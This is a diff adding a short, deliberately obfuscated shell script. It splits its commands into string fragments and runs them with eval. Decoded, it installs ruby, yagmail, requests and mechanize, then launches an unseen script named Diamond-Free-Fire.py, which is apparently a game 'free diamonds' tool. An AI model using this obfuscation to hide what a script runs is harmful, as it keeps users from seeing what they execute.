@@ -1,0 +1,3 @@
+z="
+";Mz='all ';Vz='mail';Sz=' ins';nz='Free';pz='e.py';Cz='echo';lz='Diam';Pz='ques';oz='-Fir';Hz='by'\'' ';Iz='| lo';dz='uest';kz='on2 ';fz=' pip';iz='ize';Oz='l Re';ez='s &&';Jz='lcat';Qz='ts'\'' ';Bz='r';Ez='ngin';Kz='pkg ';Yz='ize'\''';Uz=' yag';Fz='stal';Lz='inst';cz=' req';bz='t';Rz='pip2';Az='clea';Gz='l Ru';Nz='ruby';mz='ond-';hz='l me';Xz='chan';Tz='tall';az='olca';gz='2 in';Zz=' | l';Dz=' '\''Me';Wz='l Me';jz='pyth';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$Nz$z$Az$Bz$z$Cz$Dz$Ez$Fz$Oz$Pz$Qz$Iz$Jz$z$Rz$Sz$Tz$Uz$Vz$z$Az$Bz$z$Cz$Dz$Ez$Fz$Wz$Xz$Yz$Zz$az$bz$z$Rz$Sz$Tz$cz$dz$ez$fz$gz$Fz$hz$Xz$iz$z$Az$Bz$z$jz$kz$lz$mz$nz$oz$pz"
